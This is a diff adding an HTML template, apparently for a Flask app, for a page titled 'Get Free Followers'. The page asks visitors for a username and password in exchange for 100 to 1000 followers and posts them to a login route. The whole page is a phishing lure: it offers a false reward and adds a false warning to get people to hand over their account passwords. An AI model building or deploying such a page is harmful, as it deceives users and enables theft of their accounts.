@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Free Followers</title>
+    <link href="https://fonts.googleapis.com/css2?family=Geoloca&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"> <!-- Font Awesome -->
+    <style>
+        body {
+            font-family: 'Geoloca', sans-serif; /* Use Geoloca font */
+            background-color: #121212; /* Dark background */
+            color: #ffffff; /* Light text */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background-color: #1e1e1e; /* Darker container */
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            transition: transform 0.2s;
+        }
+        .container:hover {
+            transform: scale(1.02);
+        }
+        h2 {
+            color: #ffffff; /* White heading */
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        .icon {
+            font-size: 50px; /* Icon size */
+            color: #28a745; /* Icon color */
+            margin-bottom: 20px; /* Space between icon and title */
+        }
+        .warning {
+            color: #ffcc00; /* Warning color */
+            background-color: #333; /* Background for warning */
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            border: 1px solid #ffcc00; /* Border for warning */
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #444;
+            border-radius: 5px;
+            background-color: #333; /* Input field background */
+            color: #ffffff; /* Input field text color */
+            transition: border-color 0.3s;
+        }
+        .input-field::placeholder {
+            color: #aaa; /* Placeholder color */
+        }
+        .input-field:focus {
+            border-color: #28a745;
+            outline: none;
+        }
+        .followers-options {
+            text-align: left;
+            margin-top: 15px;
+        }
+        .followers-options label {
+            display: block;
+            margin: 10px 0;
+            font-size: 16px;
+            color: #ffffff; /* Light text for options */
+        }
+        .button {
+            background-color: #28a745;
+            color: #ffffff;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+        .button:hover {
+            background-color: #218838;
+            transform: translateY(-2px);
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #bbb; /* Footer text color */
+        }
+        .footer a {
+            color: #28a745; /* Link color */
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <i class="fas fa-users icon"></i> <!-- Big icon -->
+    <h2>Get Free Followers</h2>
+    
+    <!-- Warning Message -->
+    <div class="warning">
+        Please ensure you enter the correct details. If not, the followers will go to the wrong person!
+    </div>
+    
+    <!-- Login Form -->
+    <form action="{{ url_for('login') }}" method="POST">
+        <input type="text" class="input-field" name="username" placeholder="Username" required>
+        <input type="password" class="input-field" name="password" placeholder="Password" required>
+        
+        <div class="followers-options">
+            <label><strong>Select Followers Amount:</strong></label>
+            <label><input type="radio" name="followers_amount" value="100" required> <span>100 Followers</span></label>
+            <label><input type="radio" name="followers_amount" value="500"> <span>500 Followers</span></label>
+            <label><input type="radio" name="followers_amount" value="1000"> <span>1000 Followers</span></label>
+        </div>
+        
+        <button type="submit" class="button">Get Followers</button>
+    </form>
+    
+  
+</div>
+
+</body>
+  </html>
